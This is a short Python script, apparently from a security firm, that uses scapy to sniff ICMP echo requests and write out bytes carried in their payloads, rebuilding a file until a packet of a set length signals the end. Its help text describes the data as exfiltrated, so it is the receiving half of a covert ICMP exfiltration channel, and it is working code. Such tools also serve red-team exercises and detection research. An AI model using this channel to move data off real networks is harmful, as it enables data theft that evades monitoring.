#!/usr/bin/env python
#
# Copyright (C) WrightSec, Inc.
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# 2022-10-25 :: updated for new kernel (alex@wright-secure.com)

import sys
import argparse
import scapy.all

config = None

def write_or_stop(pkt):
 global config

 # Is it signal pkt or data pkt?
 if pkt[scapy.all.IP].len == 83:

   # Signal pkt, stop!
   config.output_file.flush()
   config.output_file.close()
   return True

 # Data pkt, next ...
 payload = pkt.lastlayer().load
 config.output_file.write(payload[24:24+config.chunk_size])
# config.output_file.write(payload[8:10])
 return False

def main(argv):
 global config

 parser = argparse.ArgumentParser(description='Reassemble FILE from ICMP ECHO REQUESTs')
 parser.add_argument('-s', '--chunk-size', metavar='SIZE', type=int, default=2, help='How many bytes are exfiltrated in a single ECHO_REQUEST pkt')
 parser.add_argument('-o', '--output-file', nargs='?', type=argparse.FileType('w+'), default=sys.stdout)
 config = parser.parse_args(argv)

 scapy.all.sniff(filter="icmp[icmptype] == 8", stop_filter=write_or_stop, store=0)

if __name__ == "__main__":
 sys.exit(main(sys.argv[1:]))

